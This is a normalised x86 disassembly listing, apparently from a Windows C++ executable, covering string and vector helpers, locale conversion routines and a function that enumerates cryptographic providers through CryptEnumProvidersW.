push ebp
mov ebp esp
push 0xffffffff
push sub_451ad0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_406210
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_402530
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx * 8 ]
sub edx ebx
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
mov edi [ esi + 0x4 ]
mov eax [ esi ]
call sub_402330
mov ecx [ esi ]
push ecx
call sub_43811c
add esp 0x4
sub_402170
push ebp
mov ebp esp
push 0xffffffff
push sub_451330
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x0
call sub_437cb3
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_43c3a5
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_402370
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_438178
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_43811c
mov ecx [ ebp + 0x10 ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_43a8a0
mov ecx [ ebp + 0x10 ]
add esp 0xc
sub_4022af
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_43c3a5
int3
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
sub_4022e0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
shl ecx 0x5
push ecx
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_402330
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
sub_402370
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
lea eax [ ecx + ecx ]
push eax
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_4023e0
cmp esi edi
je r-xdata
mov eax esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_437db0
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
sub_402450
push ebp
mov ebp esp
push 0xffffffff
push sub_4523e1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
lea edi [ ecx + 0x10 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
add esi 0x20
add edi 0x20
jmp r-xdata
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp esi eax
je r-xdata
lea eax [ edi - 0x10 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edx [ edi + 0xc ]
mov [ esi + 0x1c ] edx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] ebx
xor edx edx
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
cmp [ edi + 0x4 ] 0x8
lea ebx [ edi - 0x10 ]
jae r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] edx
mov eax [ edi ]
inc eax
add eax eax
push eax
push ebx
push esi
call sub_437db0
add esp 0xc
jmp r-xdata
mov edx [ edi ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x4 ] 0x7
mov [ edi ] 0x0
mov [ ebx ] cx
sub_402530
push ebp
mov ebp esp
push 0xffffffff
push sub_4523e1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
lea ecx [ ecx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
cmp esi edi
je r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push edi
push esi
call sub_437db0
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
sub_402600
push ebp
mov ebp esp
push 0xffffffff
push sub_451104
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_436188
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push eax
push esi
call sub_435faf
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_437cb3
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_43c3a5
sub_4026b0
push ebp
mov ebp esp
push 0xffffffff
push sub_451034
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_435f3c
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_4381f8
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_4381f8
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_4381f8
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_4381f8
add esp 0x4
sub_402780
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_436188
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ esi ] eax
sub_4027c0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_4361b0
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_4027f0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_4361b0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_402840
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_402890
push ebp
mov ebp esp
mov ecx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
test eax eax
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
pop esi
pop ebp
retn 0x4
sub_4028d0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_402900
push ebp
mov ebp esp
push 0xffffffff
push sub_45130b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x20
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_4026b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_402600
push eax
mov ecx esi
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_4029c0
jmp r-xdata
sub_4029c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push esi
lea eax [ esp + 0x8 ]
push eax
mov esi ecx
call sub_43668d
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x10 ] ecx
mov edx [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] edx
call sub_435bc6
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_402a10
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add ecx 0x8
push ecx
push eax
call sub_4366ed
add esp 0x8
test [ ebp + 0x8 ] ax
mov eax 0x0
setne al
pop ebp
retn 0x8
sub_402a40
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
add ecx 0x8
push ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edx
call sub_436711
add esp 0x10
pop ebp
retn 0xc
sub_402a60
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
jne r-xdata
sub_402aa0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
je r-xdata
sub_402b00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_43620f
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_402b60
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_436275
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_402ba0
push ebp
mov ebp esp
sub esp 0x8
mov al [ ebp + 0x8 ]
add ecx 0x18
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] al
push edx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x8 ] 0x0
call sub_43640d
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
mov esp ebp
pop ebp
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_402be0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
add ecx 0x18
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
lea ebx [ ebx ]
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov al [ esi ]
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov [ ebp + 0x8 ] al
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov [ ebp + 0x10 ] 0x0
call sub_43640d
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
pop edi
sub_402c50
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
add ecx 0x18
push ecx
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0x10 ] 0x0
call sub_435b3f
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp - 0xc ]
sub_402ca0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
mov esp ebp
pop ebp
retn 0x10
add ecx 0x18
mov [ ebp - 0x14 ] ecx
mov [ edi ] al
add esi 0x2
inc edi
cmp esi ebx
jne r-xdata
mov al [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
movzx eax [ esi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x10 ] 0x0
call sub_435b3f
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0x10 ]
jne r-xdata
sub_402d10
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_4381f8
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_402d50
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x8 ]
and eax 0x17
sub esp 0x18
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
and ecx eax
push esi
push edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi 0x1
test cl 0x4
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
test cl 0x2
je r-xdata
call sub_435c7b
mov edi eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] r--data
call sub_437cb3
push r--data
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_43c3a5
call sub_435c7b
lea ecx [ esp + 0x8 ]
push ecx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_437cb3
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_43c3a5
call sub_435c7b
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_437cb3
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_43c3a5
sub_402e50
push ebp
mov ebp esp
mov eax [ ecx + 0x30 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ edi ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp + 0x8 ]
call sub_4361b0
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_402e90
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
xor edi edi
push edi
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_402d50
push 0x4
call sub_438178
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43609f
mov [ ebx ] eax
call sub_435e5e
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_436188
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_4361b0
mov [ esi + 0x30 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_402f20
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_437d2d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_402f60
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402f90
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402fc0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_435d94
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_402ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_4525f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
lea ecx [ ebp - 0x30 ]
push ecx
push edi
lea edx [ ebp - 0x34 ]
push edx
push edi
push edi
xor ebx ebx
push edi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] ebx
call [ CryptEnumProvidersW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x103
sete al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x30 ]
xor ecx ecx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x4
mov esi eax
lea eax [ ebp - 0x30 ]
push eax
push esi
lea ecx [ ebp - 0x34 ]
push ecx
push edi
push edi
push ebx
call [ CryptEnumProvidersW@IAT ]
test eax eax
je r-xdata
push esi
call sub_438111
add esp 0x4
lea edx [ ebp - 0x30 ]
push edx
push edi
lea eax [ ebp - 0x34 ]
push eax
push edi
inc ebx
push edi
push ebx
mov [ ebp - 0x38 ] ebx
call [ CryptEnumProvidersW@IAT ]
test eax eax
jne r-xdata
xor edx edx
mov eax esi
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax esi
lea ecx [ ebp - 0x2c ]
call sub_401c90
mov ebx [ ebp - 0x3c ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] edi
call sub_4039d0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ebx [ ebp - 0x38 ]
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
sub_403140
push ebp
mov ebp esp
push 0xffffffff
push sub_4525c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x100
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
movzx ecx cl
xor ebx ebx
neg ecx
sbb ecx ecx
and ecx 0x20
or ecx 0xf0000000
push ecx
push 0x1
push ebx
push ebx
lea edx [ ebp - 0x38 ]
mov [ ebp - 0x40 ] ebx
push edx
